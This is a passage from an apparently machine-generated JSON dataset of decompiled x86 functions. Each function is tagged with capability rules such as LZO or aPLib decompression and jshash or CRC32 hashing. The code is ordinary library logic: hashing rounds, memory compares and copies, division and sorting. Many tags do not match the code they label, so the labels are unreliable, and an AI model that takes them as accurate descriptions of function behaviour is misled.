uVar4 >> 0x1c) + uVar1;\n    uVar3 = uVar3 + param_2[8] + *0x490834 + (uVar1 ^ uVar4 ^ uVar2);\n    uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar4;\n    uVar2 = uVar2 + param_2[0xb] + *0x490838 + (uVar4 ^ uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x10000 | uVar2 >> 0x10) + uVar3;\n    uVar1 = uVar1 + param_2[0xe] + *0x49083c + (uVar3 ^ uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x800000 | uVar1 >> 9) + uVar2;\n    uVar4 = uVar4 + param_2[1] + *0x490840 + (uVar2 ^ uVar1 ^ uVar3);\n    uVar4 = (uVar4 * 0x10 | uVar4 >> 0x1c) + uVar1;\n    uVar3 = uVar3 + param_2[4] + *0x490844 + (uVar1 ^ uVar4 ^ uVar2);\n    uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar4;\n    uVar2 = uVar2 + param_2[7] + *0x490848 + (uVar4 ^ uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x10000 | uVar2 >> 0x10) + uVar3;\n    uVar1 = uVar1 + param_2[10] + *0x49084c + (uVar3 ^ uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x800000 | uVar1 >> 9) + uVar2;\n    uVar4 = uVar4 + param_2[0xd] + *0x490850 + (uVar2 ^ uVar1 ^ uVar3);\n    uVar4 = (uVar4 * 0x10 | uVar4 >> 0x1c) + uVar1;\n    uVar3 = uVar3 + *param_2 + *0x490854 + (uVar1 ^ uVar4 ^ uVar2);\n    uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar4;\n    uVar2 = uVar2 + param_2[3] + *0x490858 + (uVar4 ^ uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x10000 | uVar2 >> 0x10) + uVar3;\n    uVar1 = uVar1 + param_2[6] + *0x49085c + (uVar3 ^ uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x800000 | uVar1 >> 9) + uVar2;\n    uVar4 = uVar4 + param_2[9] + *0x490860 + (uVar2 ^ uVar1 ^ uVar3);\n    uVar4 = (uVar4 * 0x10 | uVar4 >> 0x1c) + uVar1;\n    uVar3 = uVar3 + param_2[0xc] + *0x490864 + (uVar1 ^ uVar4 ^ uVar2);\n    uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar4;\n    uVar2 = uVar2 + param_2[0xf] + *0x490868 + (uVar4 ^ uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x10000 | uVar2 >> 0x10) + uVar3;\n    uVar1 = uVar1 + param_2[2] + *0x49086c + (uVar3 ^ uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x800000 | uVar1 >> 9) + uVar2;\n    uVar4 = uVar4 + *param_2 + *0x490870 + ((~uVar3 | uVar1) ^ uVar2);\n    uVar4 = (uVar4 * 0x40 | uVar4 >> 0x1a) + uVar1;\n    uVar3 = uVar3 + param_2[7] + *0x490874 + ((~uVar2 | uVar4) ^ uVar1);\n    uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar4;\n    uVar2 = uVar2 + param_2[0xe] + *0x490878 + ((~uVar1 | uVar3) ^ uVar4);\n    uVar2 = (uVar2 * 0x8000 | uVar2 >> 0x11) + uVar3;\n    uVar1 = uVar1 + param_2[5] + *0x49087c + ((~uVar4 | uVar2) ^ uVar3);\n    uVar1 = (uVar1 * 0x200000 | uVar1 >> 0xb) + uVar2;\n    uVar4 = uVar4 + param_2[0xc] + *0x490880 + ((~uVar3 | uVar1) ^ uVar2);\n    uVar4 = (uVar4 * 0x40 | uVar4 >> 0x1a) + uVar1;\n    uVar3 = uVar3 + param_2[3] + *0x490884 + ((~uVar2 | uVar4) ^ uVar1);\n    uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar4;\n    uVar2 = uVar2 + param_2[10] + *0x490888 + ((~uVar1 | uVar3) ^ uVar4);\n    uVar2 = (uVar2 * 0x8000 | uVar2 >> 0x11) + uVar3;\n    uVar1 = uVar1 + param_2[1] + *0x49088c + ((~uVar4 | uVar2) ^ uVar3);\n    uVar1 = (uVar1 * 0x200000 | uVar1 >> 0xb) + uVar2;\n    uVar4 = uVar4 + param_2[8] + *0x490890 + ((~uVar3 | uVar1) ^ uVar2);\n    uVar4 = (uVar4 * 0x40 | uVar4 >> 0x1a) + uVar1;\n    uVar3 = uVar3 + param_2[0xf] + *0x490894 + ((~uVar2 | uVar4) ^ uVar1);\n    uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar4;\n    uVar2 = uVar2 + param_2[6] + *0x490898 + ((~uVar1 | uVar3) ^ uVar4);\n    uVar2 = (uVar2 * 0x8000 | uVar2 >> 0x11) + uVar3;\n    uVar1 = uVar1 + param_2[0xd] + *0x49089c + ((~uVar4 | uVar2) ^ uVar3);\n    uVar1 = (uVar1 * 0x200000 | uVar1 >> 0xb) + uVar2;\n    uVar4 = uVar4 + param_2[4] + *0x4908a0 + ((~uVar3 | uVar1) ^ uVar2);\n    uVar4 = (uVar4 * 0x40 | uVar4 >> 0x1a) + uVar1;\n    uVar3 = uVar3 + param_2[0xb] + *0x4908a4 + ((~uVar2 | uVar4) ^ uVar1);\n    uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar4;\n    uVar2 = uVar2 + param_2[2] + *0x4908a8 + ((~uVar1 | uVar3) ^ uVar4);\n    uVar2 = (uVar2 * 0x8000 | uVar2 >> 0x11) + uVar3;\n    uVar1 = uVar1 + param_2[9] + *0x4908ac + ((~uVar4 | uVar2) ^ uVar3);\n    *in_EAX = *in_EAX + uVar4;\n    in_EAX[1] = in_EAX[1] + (uVar1 * 0x200000 | uVar1 >> 0xb) + uVar2;\n    in_EAX[2] = in_EAX[2] + uVar2;\n    in_EAX[3] = in_EAX[3] + uVar3;\n    return;\n}\n",
        "token_count": 4558
    },
    "004039c8": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004039c8(uint param_1, uint8_t *param_2)\n\n{\n    uint8_t *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    \n    uVar2 = *param_2;\n    piVar4 = in_EAX + 1;\n    piVar5 = param_2 + 1;\n    iVar1 = *in_EAX - uVar2;\n    if (*in_EAX < uVar2 || iVar1 == 0) {\n        uVar2 = uVar2 + iVar1;\n    }\n    uVar3 = uVar2 >> 2;\n    do {\n        if (uVar3 == 0) {\ncode_r0x00403a0b:\n            uVar3 = uVar2 & 3;\n            uVar2 = uVar3;\n            if ((uVar3 == 0) ||\n               ((*piVar4 == *piVar5 &&\n                ((uVar2 = uVar3 - 1,  uVar2 == 0 ||\n                 ((*(piVar4 + 1) == *(piVar5 + 1) &&\n                  ((uVar2 = uVar3 - 2,  uVar2 == 0 || (*(piVar4 + 2) == *(piVar5 + 2))))))))))) {\n                iVar1 = iVar1 * 2;\n            }\ncode_r0x00403a46:\n            return CONCAT44(uVar2, iVar1);\n        }\n        if (*piVar4 != *piVar5) goto code_r0x00403a46;\n        if (uVar3 == 1) {\n            piVar4 = piVar4 + 1;\n            piVar5 = piVar5 + 1;\n            goto code_r0x00403a0b;\n        }\n        if (piVar4[1] != piVar5[1]) goto code_r0x00403a46;\n        piVar4 = piVar4 + 2;\n        piVar5 = piVar5 + 2;\n        uVar3 = uVar3 - 2;\n    } while( true );\n}\n",
        "token_count": 490
    },
    "00403a4c": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00403a4c(uint32_t param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = param_1 >> 2;\n    do {\n        if (uVar1 == 0) {\ncode_r0x00403a7c:\n            param_1 = param_1 & 3;\n            if (((param_1 != 0) && (*in_EAX == *param_2)) &&\n               ((param_1 == 1 ||\n                ((*(in_EAX + 1) == *(param_2 + 1) && ((param_1 == 2 || (*(in_EAX + 2) == *(param_2 + 2))))))))) {\n                return NULL;\n            }\n            return in_EAX;\n        }\n        if (*in_EAX != *param_2) {\n            return in_EAX;\n        }\n        if (uVar1 == 1) {\n            in_EAX = in_EAX + 1;\n            param_2 = param_2 + 1;\n            goto code_r0x00403a7c;\n        }\n        if (in_EAX[1] != param_2[1]) {\n            return in_EAX;\n        }\n        in_EAX = in_EAX + 2;\n        param_2 = param_2 + 2;\n        uVar1 = uVar1 - 2;\n    } while( true );\n}\n",
        "token_count": 328
    },
    "0040465c": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404691)\n// WARNING: Removing unreachable block (ram,0x00404697)\n// WARNING: Removing unreachable block (ram,0x0040469e)\n// WARNING: Removing unreachable block (ram,0x004046a4)\n// WARNING: Removing unreachable block (ram,0x004046aa)\n\nvoid __fastcall fcn.0040465c(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    \n    *param_2 = in_EAX;\n    uVar2 = *(in_EAX + -0x28);\n    uVar1 = uVar2 >> 2;\n    piVar3 = param_2 + 1;\n    while (uVar1 = uVar1 - 1,  uVar1 != 0) {\n        *piVar3 = 0;\n        piVar3 = piVar3 + 1;\n    }\n    for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *piVar3 = 0;\n        piVar3 = piVar3 + 1;\n    }\n    for (; *(in_EAX + -0x24) != NULL; in_EAX = **(in_EAX + -0x24)) {\n    }\n    return;\n}\n",
        "token_count": 325
    },
    "00405ed4": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405ed4(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if (((in_EAX != param_2) && (in_EAX != NULL)) && (param_2 != NULL)) {\n        uVar2 = param_2[-1];\n        iVar1 = in_EAX[-1] - uVar2;\n        if (in_EAX[-1] < uVar2 || iVar1 == 0) {\n            uVar2 = uVar2 + iVar1;\n        }\n        uVar2 = uVar2 >> 2;\n        for (; ((uVar2 != 0 && (*in_EAX == *param_2)) && ((uVar2 != 1 && (in_EAX[1] == param_2[1]))));\n            in_EAX = in_EAX + 2) {\n            param_2 = param_2 + 2;\n            uVar2 = uVar2 - 2;\n        }\n    }\n    return;\n}\n",
        "token_count": 241
    },
    "0040a8e4": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a8e4(int32_t param_1, uint *param_2)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    bool bVar4;\n    \n    bVar4 = param_1 == 0;\n    iVar1 = param_1;\n    puVar3 = param_2;\n    if (!bVar4) {\n        do {\n            if (iVar1 == 0) break;\n            iVar1 = iVar1 + -1;\n            bVar4 = *puVar3 == '\\0';\n            puVar3 = puVar3 + 1;\n        } while (!bVar4);\n        if (bVar4) {\n            iVar1 = iVar1 + 1;\n        }\n    }\n    for (uVar2 = param_1 - iVar1 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *in_EAX = *param_2;\n        param_2 = param_2 + 1;\n        in_EAX = in_EAX + 1;\n    }\n    for (uVar2 = param_1 - iVar1 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *in_EAX = *param_2;\n        param_2 = param_2 + 1;\n        in_EAX = in_EAX + 1;\n    }\n    *in_EAX = 0;\n    return;\n}\n",
        "token_count": 338
    },
    "0041cfd8": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041cfd8(uint32_t param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    \n    while (param_1 != 0) {\n        uVar2 = *(in_EAX + 0x14) - *(in_EAX + 0x10);\n        if (*(in_EAX + 0x14) < *(in_EAX + 0x10) || uVar2 == 0) {\n            fcn.0041d024();\n            uVar2 = *(in_EAX + 0x14);\n        }\n        if (param_1 <= uVar2) {\n            uVar2 = param_1;\n        }\n        param_1 = param_1 - uVar2;\n        iVar1 = *(in_EAX + 0x10);\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + uVar2;\n        puVar4 = *(in_EAX + 8) + iVar1;\n        for (uVar3 = uVar2 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *param_2 = *puVar4;\n            puVar4 = puVar4 + 1;\n            param_2 = param_2 + 1;\n        }\n        for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *param_2 = *puVar4;\n            puVar4 = puVar4 + 1;\n            param_2 = param_2 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 400
    },
    "0041f48c": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041f48c(uint32_t param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    \n    while (param_1 != 0) {\n        uVar2 = *(in_EAX + 0xc) - *(in_EAX + 0x10);\n        if (*(in_EAX + 0xc) < *(in_EAX + 0x10) || uVar2 == 0) {\n            fcn.0041f4d8();\n            uVar2 = *(in_EAX + 0xc);\n        }\n        if (param_1 <= uVar2) {\n            uVar2 = param_1;\n        }\n        param_1 = param_1 - uVar2;\n        iVar1 = *(in_EAX + 0x10);\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + uVar2;\n        puVar4 = *(in_EAX + 8) + iVar1;\n        for (uVar3 = uVar2 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar4 = *param_2;\n            param_2 = param_2 + 1;\n            puVar4 = puVar4 + 1;\n        }\n        for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar4 = *param_2;\n            param_2 = param_2 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 399
    },
    "0046f7a4": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0046f7a4(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    char *pcVar3;\n    char *pcVar4;\n    char *pcVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    char *pcVar8;\n    uint32_t uStack40;\n    uint32_t uStack36;\n    uint32_t uStack32;\n    char cStack16;\n    char cStack15;\n    \n    uStack36 = *(in_EAX + 0x78);\n    uVar2 = *(in_EAX + 0x74);\n    pcVar3 = *(in_EAX + 0x34) + *(in_EAX + 0x68);\n    if (*(in_EAX + 0x28) - 0x106U < *(in_EAX + 0x68)) {\n        uVar6 = *(in_EAX + 0x68) - (*(in_EAX + 0x28) + -0x106);\n    }\n    else {\n        uVar6 = 0;\n    }\n    cStack16 = pcVar3[uVar2 - 1];\n    pcVar5 = *(in_EAX + 0x34) + *(in_EAX + 0x68);\n    cStack15 = pcVar3[uVar2];\n    if (*(in_EAX + 0x88) <= *(in_EAX + 0x74)) {\n        uStack36 = uStack36 >> 2;\n    }\n    uStack40 = param_2;\n    uStack32 = *(in_EAX + 0x8c);\n    if (*(in_EAX + 0x70) < *(in_EAX + 0x8c)) {\n        uStack32 = *(in_EAX + 0x70);\n    }\n    do {\n        pcVar8 = *(in_EAX + 0x34) + uStack40;\n        if ((((pcVar8[uVar2] == cStack15) && (pcVar8[uVar2 - 1] == cStack16)) && (*pcVar8 == *pcVar3)) &&\n           (pcVar8[1] == pcVar3[1])) {\n            pcVar8 = pcVar8 + 2;\n            pcVar3 = pcVar3 + 2;\n            while (((((pcVar4 = pcVar3 + 1,  *pcVar4 == pcVar8[1] && (pcVar4 = pcVar3 + 2,  *pcVar4 == pcVar8[2])) &&\n                     ((pcVar4 = pcVar3 + 3,  *pcVar4 == pcVar8[3] &&\n                      ((pcVar4 = pcVar3 + 4,  *pcVar4 == pcVar8[4] && (pcVar4 = pcVar3 + 5,  *pcVar4 == pcVar8[5]))))))\n                    && (pcVar4 = pcVar3 + 6,  *pcVar4 == pcVar8[6])) && (pcVar4 = pcVar3 + 7,  *pcVar4 == pcVar8[7]))) {\n                pcVar4 = pcVar3 + 8;\n                pcVar8 = pcVar8 + 8;\n                if ((*pcVar4 != *pcVar8) || (pcVar3 = pcVar4,  pcVar5 + 0x102 <= pcVar4)) break;\n            }\n            iVar1 = -((pcVar5 + 0x102) - pcVar4);\n            uVar7 = iVar1 + 0x102;\n            pcVar3 = pcVar5;\n            if (uVar2 < uVar7) {\n                *(in_EAX + 0x6c) = uStack40;\n                if (uStack32 <= uVar7) {\ncode_r0x0046f903:\n                    uVar2 = *(in_EAX + 0x70);\n                    if (uVar7 <= uVar2) {\n                        uVar2 = uVar7;\n                    }\n                    return uVar2;\n                }\n                cStack16 = pcVar5[iVar1 + 0x101];\n                cStack15 = pcVar5[uVar7];\n                uVar2 = uVar7;\n            }\n        }\n        uVar7 = uVar2;\n        uStack40 = *(*(in_EAX + 0x3c) + (uStack40 & *(in_EAX + 0x30)) * 2);\n        if ((uStack40 <= uVar6) || (uStack36 = uStack36 - 1,  uVar2 = uVar7,  uStack36 == 0)) goto code_r0x0046f903;\n    } while( true );\n}\n",
        "token_count": 1059
    },
    "00405758": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405758(uint param_1, int16_t *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h;\n    int16_t *piVar2;\n    \n    arg_8h = 0;\n    piVar2 = param_2;\n    if (param_2 != NULL) {\n        for (; *piVar2 != 0; piVar2 = piVar2 + 4) {\n            if (piVar2[1] == 0) {\ncode_r0x00405781:\n                piVar2 = piVar2 + 1;\n                break;\n            }\n            if (piVar2[2] == 0) {\ncode_r0x0040577e:\n                piVar2 = piVar2 + 1;\n                goto code_r0x00405781;\n            }\n            if (piVar2[3] == 0) {\n                piVar2 = piVar2 + 1;\n                goto code_r0x0040577e;\n            }\n        }\n        arg_8h = piVar2 - param_2 >> 1;\n    }\n    if (arg_8h == 0) {\n        fcn.00405530(param_2);\n    }\n    else if ((arg_8h + 1 < 0x7ff) && (iVar1 = fcn.00405650(arg_8h),  -1 < iVar1)) {\n        fcn.00405620();\n    }\n    else {\n        fcn.00405c6c();\n        fcn.00405650(arg_8h);\n        fcn.00405c6c();\n    }\n    return;\n}\n",
        "token_count": 365
    },
    "004057d4": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004057d4(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h;\n    \n    arg_8h = 0;\n    if (param_2 != 0) {\n        arg_8h = *(param_2 + -4) >> 1;\n    }\n    if (arg_8h == 0) {\n        fcn.00405530(param_2);\n    }\n    else if ((arg_8h + 1 < 0x7ff) && (iVar1 = fcn.00405650(arg_8h),  -1 < iVar1)) {\n        fcn.00405620();\n    }\n    else {\n        fcn.00405c6c();\n        fcn.00405650(arg_8h);\n        fcn.00405c6c();\n    }\n    return;\n}\n",
        "token_count": 199
    },
    "00405d64": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __fastcall fcn.00405d64(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (*in_EAX != param_2) {\n        if ((param_2 == 0) || (*(param_2 + -4) >> 1 == 0)) {\n            iVar1 = *in_EAX;\n            if (iVar1 != 0) {\n                *in_EAX = 0;\n                sub.oleaut32.dll_SysFreeString(iVar1);\n            }\n            return;\n        }\n        iVar1 = sub.oleaut32.dll_SysReAllocStringLen();\n        if (iVar1 == 0) {\n            if (*0x493008 != NULL) {\n                (**0x493008)();\n            }\n            fcn.00402ff8();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 212
    },
    "00405e6c": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __fastcall fcn.00405e6c(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    \n    uVar3 = 0;\n    piVar4 = param_2;\n    if (param_2 != NULL) {\n        for (; *piVar4 != 0; piVar4 = piVar4 + 2) {\n            if (*(piVar4 + 2) == 0) {\ncode_r0x00405e95:\n                piVar4 = piVar4 + 2;\n                break;\n            }\n            if (*(piVar4 + 1) == 0) {\ncode_r0x00405e92:\n                piVar4 = piVar4 + 2;\n                goto code_r0x00405e95;\n            }\n            if (*(piVar4 + 6) == 0) {\n                piVar4 = piVar4 + 2;\n                goto code_r0x00405e92;\n            }\n        }\n        uVar3 = piVar4 - param_2 >> 1;\n    }\n    if (uVar3 == 0) {\n        iVar2 = *in_EAX;\n        if (iVar2 != 0) {\n            *in_EAX = 0;\n            sub.oleaut32.dll_SysFreeString(iVar2);\n        }\n        return;\n    }\n    iVar2 = sub.oleaut32.dll_SysAllocStringLen(param_2, uVar3);\n    if (iVar2 != 0) {\n        iVar1 = *param_2;\n        *param_2 = iVar2;\n        sub.oleaut32.dll_SysFreeString(iVar1);\n        return;\n    }\n    if (*0x493008 != NULL) {\n        (**0x493008)();\n    }\n    fcn.00402ff8();\n    return;\n}\n",
        "token_count": 447
    },
    "00405ec8": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid fcn.00405ec8(void)\n\n{\n    return;\n}\n",
        "token_count": 16
    },
    "004064c0": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004064c0(uint param_1, uint32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint8_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    bool bVar10;\n    \n    uVar8 = param_2 >> 0x1f;\n    uVar3 = (in_EAX ^ uVar8) - uVar8;\n    uVar6 = ((param_2 ^ uVar8) - uVar8) - ((in_EAX ^ uVar8) < uVar8);\n    uVar8 = param_4 >> 0x1f;\n    uVar9 = (param_2 ^ param_4) >> 0x1f;\n    uVar7 = (param_3 ^ uVar8) - uVar8;\n    uVar8 = ((param_4 ^ uVar8) - uVar8) - ((param_3 ^ uVar8) < uVar8);\n    if (uVar8 == 0) {\n        if (uVar7 <= uVar6) {\n            uVar8 = uVar6 / uVar7;\n            uVar6 = uVar6 % uVar7;\n        }\n        uVar3 = CONCAT44(uVar6, uVar3) / uVar7;\n    }\n    else {\n        bVar10 = (uVar8 & 1) != 0;\n        iVar4 = 0x1f;\n        if (uVar8 != 0) {\n            for (; uVar8 >> iVar4 == 0; iVar4 = iVar4 + -1) {\n            }\n        }\n        uVar5 = iVar4;\n        uVar1 = CONCAT44((uVar6 >> 1) >> (uVar5 & 0x1f), \n                         (uVar3 >> 1 | ((uVar6 & 1) != 0) << 0x1f) >> (uVar5 & 0x1f) |\n                         (uVar6 >> 1) << 0x20 - (uVar5 & 0x1f)) /\n                ((uVar7 >> 1 | bVar10 << 0x1f) >> (uVar5 & 0x1f) |\n                (uVar8 >> 1 | bVar10 << 0x1f) << 0x20 - (uVar5 & 0x1f));\n        iVar4 = uVar1;\n        iVar2 = (uVar1 & 0xffffffff) * uVar7;\n        uVar8 = (iVar2 >> 0x20) + (uVar8 & 0xfffffffe | bVar10) * iVar4;\n        uVar3 = iVar4 - (uVar6 < uVar8 || uVar6 - uVar8 < (uVar3 < iVar2));\n        uVar8 = 0;\n    }\n    return CONCAT44(((uVar8 ^ uVar9) - uVar9) - ((uVar3 ^ uVar9) < uVar9), (uVar3 ^ uVar9) - uVar9);\n}\n",
        "token_count": 743
    },
    "0041b530": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b530(code *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t in_ECX;\n    uint32_t in_EDX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_8h = in_EDX;\n    do {\n        var_10h = var_8h + in_ECX >> 1;\n        uVar3 = var_8h;\n        uVar4 = in_ECX;\n        do {\n            while (iVar2 = (*arg_8h)(),  iVar2 < 0) {\n                uVar3 = uVar3 + 1;\n            }\n            while (iVar2 = (*arg_8h)(),  0 < iVar2) {\n                uVar4 = uVar4 - 1;\n            }\n            if (uVar3 <= uVar4) {\n                fcn.0041b238();\n                uVar1 = uVar4;\n                if ((uVar3 != var_10h) && (uVar1 = var_10h,  uVar4 == var_10h)) {\n                    uVar1 = uVar3;\n                }\n                var_10h = uVar1;\n                uVar3 = uVar3 + 1;\n                uVar4 = uVar4 - 1;\n            }\n        } while (uVar3 <= uVar4);\n        if (var_8h < uVar4) {\n            fcn.0041b530(arg_8h);\n        }\n        var_8h = uVar3;\n    } while (uVar3 < in_ECX);\n    return;\n}\n",
        "token_count": 397
    },
    "0040bdf8": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bdf8(int32_t arg_8h)\n\n{\n    char *pcVar1;\n    char **ppcVar2;\n    \n    ppcVar2 = arg_8h + -4;\n    pcVar1 = *ppcVar2;\n    while (**ppcVar2 == *(arg_8h + -5)) {\n        *ppcVar2 = *ppcVar2 + 1;\n    }\n    *(arg_8h + -0xc) = *ppcVar2 + (1 - pcVar1);\n    return;\n}\n",
        "token_count": 127
    },
    "0041d23c": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d23c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar1 = fcn.00420584();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.00420558();\n            if ((*(iVar2 + 0x24) & 4) != 0) {\n                iVar2 = fcn.0040676c();\n                fcn.00406928(iVar2 + 1);\n                uVar3 = fcn.00420558();\n                iVar2 = fcn.0040676c();\n                *(*(arg_8h + -4) + -4 + iVar2 * 4) = uVar3;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 204
    },
    "0041eb9c": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041eb9c(uint arg_8h)\n\n{\n    char cVar1;\n    \n    while( true ) {\n        cVar1 = fcn.0041cbbc();\n        if (cVar1 != '\\0') break;\n        fcn.0041ec50();\n    }\n    fcn.0041dc78();\n    return;\n}\n",
        "token_count": 81
    },
    "0041ebf4": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ebf4(uint arg_8h)\n\n{\n    char cVar1;\n    \n    while( true ) {\n        cVar1 = fcn.0041cbbc();\n        if (cVar1 != '\\0') break;\n        cVar1 = fcn.0041cfb4();\n        if (cVar1 - 2U < 3) {\n            fcn.0041ec50();\n        }\n        fcn.0041f05c();\n        while( true ) {\n            cVar1 = fcn.0041cbbc();\n            if (cVar1 != '\\0') break;\n            fcn.0041ee00();\n        }\n        fcn.0041dc78();\n    }\n    fcn.0041dc78();\n    return;\n}\n",
        "token_count": 173
    },
    "0042c720": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
